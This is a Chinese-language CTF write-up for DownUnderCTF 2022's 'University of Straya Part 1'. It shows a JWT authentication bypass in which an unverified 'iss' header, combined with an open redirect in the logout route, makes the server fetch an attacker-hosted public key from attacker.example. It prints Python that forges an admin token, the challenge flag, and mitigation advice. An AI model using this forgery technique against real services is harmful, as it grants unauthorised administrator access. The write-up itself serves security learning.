# DownUnderCTF 2022 University of Straya Part 1 Writeup

## 题目简述

三道 University of Straya 共用同一 Flask REST API。第一题要求绕过身份验证并取得管理员权限。服务使用 RS256 JWT，但从 token 头部的 `iss` 字段动态请求公钥；虽然 `iss` 必须以 `/api/auth/pub-key` 开头，站内注销接口存在任意重定向，二者组合成公钥替换漏洞。

## 解题过程

正常登录得到的 JWT 头部包含：

```json
{
  "typ": "JWT",
  "alg": "RS256",
  "iss": "/api/auth/pub-key"
}
```

验证函数先读取未经验证的 `iss`，只做前缀正则检查，然后请求本机地址并把响应当公钥：

```python
iss = jwt.get_unverified_header(jwt_token)['iss']
if not re.search(r'^/api/auth/pub-key', iss):
    raise Exception('bad iss')

r = requests.get('http://127.0.0.1:8080' + iss)
return jwt.decode(jwt_token, r.text, algorithms=['RS256'])
```

直接把 `iss` 设成外部 URL 不满足前缀限制。但注销接口会将 `redirect` 参数原样交给 Flask `redirect()`：

```python
@auth_blueprint.route('/logout')
def logout():
    return redirect(request.args.get('redirect', '/logout'))
```

因此可构造以允许前缀开头、规范化后进入注销路由的路径：

```text
/api/auth/pub-key/../logout?redirect=https://attacker.example/public.pem
```

`requests.get` 默认跟随重定向，最终响应正文就是攻击者的公钥。先生成自己的 RSA 密钥对并公开托管公钥：

```bash
openssl genrsa -out private.pem 4096
openssl rsa -in private.pem -pubout -out public.pem
```

数据库初始化时管理员是第一个用户，ID 为 1。用私钥签发管理员 token：

```python
import jwt

private_key = open('private.pem').read()
token = jwt.encode(
    {'id': 1},
    private_key,
    algorithm='RS256',
    headers={
        'iss': '/api/auth/pub-key/../logout'
               '?redirect=https://attacker.example/public.pem'
    },
)
print(token)
```

把它作为 `Authorization: Bearer <token>` 请求 `/api/auth/isstaff`，即可得到：

```text
DUCTF{iSs_t0_h0vSt0n_c4n_U_h3r3_uS_oR_r_w3_b31nG_r3dIrEcTeD!1!}
```

## 方法总结

RS256 本身没有被破解，失效的是公钥信任链。应用在验证签名前使用攻击者控制的 `iss` 发起请求，又允许同源路径通过开放重定向跳到外部，最终接受攻击者自签 token。校验公钥应来自固定配置或严格白名单中的静态键标识，不能把未经验证的 token 字段当作可请求 URL；重定向目标也必须限制为站内安全路径。
